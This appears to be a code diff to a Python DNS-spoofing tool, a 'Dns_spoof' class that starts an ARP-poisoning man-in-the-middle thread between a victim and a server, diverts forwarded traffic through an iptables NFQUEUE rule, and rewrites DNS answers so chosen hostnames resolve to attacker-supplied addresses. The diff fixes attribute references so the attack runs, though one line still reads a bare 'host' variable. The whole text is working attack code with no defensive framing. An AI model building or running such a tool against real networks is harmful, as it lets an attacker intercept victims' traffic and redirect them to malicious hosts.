@@ -9,18 +9,20 @@ class Dns_spoof:
 
     def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
         print('in init')
-        self.queue_num = 1
-        self.pktCounter = 0
-        
+        self.queue_num = queue_num
+        self.ipVictim = ipVictim
+        self.ipServer = ipServer
+        self.host = host
+
     def __call__(self) -> None:
         print('in call')
-        arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
+        arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(self.ipVictim, self.ipServer), daemon=True)
         arpThread.start()
 
         os.system(
             f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}')
         self.queue = NetfilterQueue()
-        self.queue.bind(queue_num, call_back)
+        self.queue.bind(self.queue_num, self.call_back)
 
         try:
             self.queue.run()
@@ -29,13 +31,13 @@ class Dns_spoof:
                 f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}')
             print("iptables flushed")
         
-    def call_back(bin_packet):
+    def call_back(self, bin_packet):
         print('packet being processed')
         packet = IP(bin_packet.get_payload())
         if packet.haslayer(DNSRR):
             try:
                 queryName = packet[DNSQR].qname
-                if queryName in host:
+                if queryName in self.host:
                     packet[DNS].an = DNSRR(
                         rrname=queryName, rdata=host[queryName])
                     packet[DNS].ancount = 1
